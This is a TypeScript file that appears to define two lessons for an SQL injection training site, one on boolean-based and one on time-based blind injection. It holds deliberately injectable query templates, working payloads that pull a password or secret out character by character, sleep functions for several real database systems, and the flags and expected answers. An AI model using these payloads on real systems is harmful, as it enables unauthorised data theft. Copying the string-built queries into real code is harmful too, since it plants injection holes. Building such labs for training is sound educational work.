import type { Lab } from '../types';
import { secretsSeed, usersSeed } from './seeds';
import { fail, rowCount } from './helpers';

export const blindLabs: Lab[] = [
  {
    id: 'blind-boolean',
    title: 'Boolean Oracle: One Bit Per Request',
    category: 'blind',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'No data is echoed at all — the page only says whether the user exists. Ask it yes/no questions until a secret falls out.',
    brief: [
      'A profile lookup returns either "Profile found" or "No such user". Nothing else is reflected: no errors, no data, no stack trace.',
      'That single bit of difference is a full read channel. Every "does this exist" check can be turned into "is this character what I think it is", and then into a complete database dump.',
      'The admin password for this lab is a flag, which makes the extraction easy to verify.',
    ],
    objective: 'Extract the admin password using only the found/not-found difference.',
    appURL: 'https://social.acme.io/u?username=jdoe',
    seed: usersSeed('FLAG{blind_boolean_oracle}'),
    fields: [{ id: 'username', label: 'username parameter', placeholder: 'jdoe', value: 'jdoe' }],
    query: (v) => `SELECT id, username, email FROM users WHERE username = '${v.username}'`,
    hints: [
      'Boolean blind injection means injecting a condition that is TRUE or FALSE, then observing which response you get.',
      '`substr(password,1,1)` gives you one character; compare it to a letter.',
      'Automate: for each position, loop over printable ASCII and keep the character whose response is "Profile found".',
    ],
    walkthrough: [
      {
        title: 'Find a TRUE response',
        text: ['A normal lookup returns a row. Your injected condition must also return a row for TRUE and nothing for FALSE.'],
        payload: `jdoe' AND 1=1--`,
        result: 'Profile found (TRUE).',
      },
      {
        title: 'Confirm a FALSE response',
        text: ['The same query with a false condition must return zero rows.'],
        payload: `jdoe' AND 1=2--`,
        result: 'No such user (FALSE). You now have a working oracle.',
      },
      {
        title: 'Ask about a character',
        text: ['Replace `1=1` with a subquery over the admin password.'],
        payload: `nobody' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='F'--`,
        result: 'Profile found ⇒ the first character is "F". Change the offset to 2, 3, …',
      },
      {
        title: 'Make it fast',
        text: [
          'Equality gives 95 guesses per character. Use `>` with a binary search and it drops to about 7:',
          '`nobody\' OR (SELECT unicode(substr(password,2,1)) FROM users) > 75--` → TRUE means the character sorts after "K".',
        ],
        payload: `nobody' OR (SELECT unicode(substr(password,2,1)) FROM users WHERE username='admin') > 75--`,
        result: 'Each request halves the range. A 24-character flag costs roughly 170 requests.',
      },
      {
        title: 'The answer for this lab',
        text: [
          'Extracting character by character gives `FLAG{blind_boolean_oracle}`. Submit it below to confirm the oracle reading.',
          'Note what made this possible: the application returned *different content* for two different boolean outcomes. Even a 200-vs-500 status code, or a 3ms timing difference, is enough.',
        ],
      },
    ],
    check: (out) => {
      const rows = rowCount(out);
      if (rows > 0) {
        return { solved: false, message: `Oracle: TRUE — ${rows} row(s) returned. Your condition evaluated to true.` };
      }
      return { solved: false, message: 'Oracle: FALSE — no rows returned. Your condition evaluated to false.' };
    },
    answer: {
      label: 'Extracted admin password',
      placeholder: 'FLAG{...}',
      expected: 'FLAG{blind_boolean_oracle}',
      note: 'The password column of the admin row is the flag.',
    },
    solution: {},
    probe: {
      values: { username: `nobody' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='F'--` },
      expect: 'rows',
    },
  },

  {
    id: 'blind-time',
    title: 'Time-Based Blind: When Nothing Changes',
    category: 'blind',
    difficulty: 'Expert',
    dbms: 'SQLite (with a MySQL-style SLEEP)',
    summary: 'Identical responses, identical status codes, identical length. The only signal left is how long the database takes.',
    brief: [
      'This endpoint is hardened in the way people usually mean: it always returns the same page, in the same amount of time, with no error handling.',
      'It is still injectable. `SLEEP(seconds)` executes in the database, so a condition can delay the response — and a delay is a bit.',
      'The delay is real here: it blocks the query engine for the duration you ask for (capped at 5 seconds so you cannot hang the tab).',
    ],
    objective: 'Extract `secrets.value` using response timing.',
    appURL: 'https://social.acme.io/u?username=unknown',
    seed: [...usersSeed(), ...secretsSeed('FLAG{time_based_oracle}')],
    fields: [{ id: 'username', label: 'username parameter', placeholder: 'unknown', value: 'unknown' }],
    query: (v) => `SELECT id, username, email FROM users WHERE username = '${v.username}'`,
    hints: [
      '`CASE WHEN <condition> THEN SLEEP(2) ELSE 0 END` delays only when the condition is true.',
      'Put it in an OR so it is evaluated for the row you care about.',
      'Measure elapsed time, not content. Anything over ~1s is TRUE.',
    ],
    walkthrough: [
      {
        title: 'Prove the delay works',
        text: ['A bare SLEEP behind a true condition. Watch the elapsed time in the response panel.'],
        payload: `x' OR (CASE WHEN 1=1 THEN sleep(2) ELSE 0 END)--`,
        result: 'Response takes ~2s even though no rows are returned.',
      },
      {
        title: 'Gate the delay behind a guess',
        text: ['Now the delay only fires when the character matches.'],
        payload: `x' OR (CASE WHEN ((SELECT substr(value,1,1) FROM secrets)='F') THEN sleep(2) ELSE 0 END)--`,
        result: '2s ⇒ TRUE. Fast ⇒ FALSE.',
      },
      {
        title: 'Notes on real targets',
        text: [
          'MySQL/MariaDB: `SLEEP(5)`, or `BENCHMARK(10000000,MD5(1))`. PostgreSQL: `pg_sleep(5)`. MSSQL: `WAITFOR DELAY \'0:0:5\'`. Oracle: `DBMS_LOCK.SLEEP(5)` or a heavy `UTL_HTTP` request.',
          'Real networks are noisy. Use a baseline request, then a delay of 3–5 seconds, and repeat an ambiguous result before trusting it. Some WAFs rate-limit you into false negatives.',
        ],
      },
      {
        title: 'The answer for this lab',
        text: [
          'Walking the value one character at a time yields `FLAG{time_based_oracle}`.',
          'Timing attacks are the slowest, noisiest, most reliable-of-last-resort technique — and they work over blind, filtered channels where nothing else does.',
        ],
      },
    ],
    check: (out) => {
      if (out.error) {
        return fail(`The query errored: ${out.error}`);
      }
      const slow = out.elapsedMs >= 900;
      return {
        solved: false,
        message: slow
          ? `Oracle: TRUE — the query took ${out.elapsedMs}ms, so your condition was true.`
          : `Oracle: FALSE — the query returned in ${out.elapsedMs}ms, so your condition was false.`,
      };
    },
    answer: {
      label: 'Extracted secret',
      placeholder: 'FLAG{...}',
      expected: 'FLAG{time_based_oracle}',
      note: 'The value in the secrets table.',
    },
    solution: {},
    probe: {
      values: { username: `x' OR (CASE WHEN ((SELECT substr(value,1,1) FROM secrets)='F') THEN sleep(1) ELSE 0 END)--` },
      expect: 'slow',
      minElapsedMs: 900,
    },
  },
];
